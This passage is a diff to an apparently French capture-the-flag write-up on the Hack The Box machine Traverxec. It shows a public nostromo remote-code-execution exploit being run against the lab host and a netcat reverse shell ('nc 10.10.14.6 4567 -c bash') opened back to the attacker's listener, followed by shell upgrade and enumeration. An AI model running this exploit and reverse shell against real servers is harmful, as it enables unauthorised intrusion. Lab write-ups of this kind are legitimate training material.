@@ -34,3 +34,32 @@ cette version avec searchsploit :
 $ searchsploit nostromo
 ```
 ![Pic4](../img/traverxec4.PNG?raw=true) </br>
+
+Nous allons chercher la RCE qui correspond à la version de nostromo et l'executer :
+```bash
+$ locate 47837.py
+$ cp /usr/share/exploitdb/exploits/multiple/remote/47837.py ./
+$ cat 47837.py
+```
+![Pic5](../img/traverxec5.PNG?raw=true) </br>
+Pour l'utiliser, il faut mettre en argumant l'ip de la box + son port + la commande à exécuter, donc nous testons :
+```bash
+$ python 47837.py 10.10.10.165 80 hostname
+```
+![Pic6](../img/traverxec6.PNG?raw=true) </br>
+Nous allons alors utiliser le netcat de la box pour obtenir un shell :
+```bash
+# Nous mettons un listener sur notre machine :
+$ nc -lvnp 4567
+# Toujours sur notre machine mais sur un autre shell :
+$ python 47837.py 10.10.10.165 80 "nc 10.10.14.6 4567 -c bash"
+```
+![Pic7](../img/traverxec7.PNG?raw=true) </br>
+Nous avons un shell en tant que www-data, nous allons faire de l'énumération de base :
+```bash
+$ python -c "import pty;pty.spawn('/bin/bash')"
+$ find / -type d -perm 0755 2>/dev/null
+```
+![Pic8](../img/traverxec8.PNG?raw=true) </br>
+Un résultat plutot dense mais nous pouvons voir que nous avons accès a plusieurs fichiers de Nostromo, y compris son fichier de configuration :
+```bash
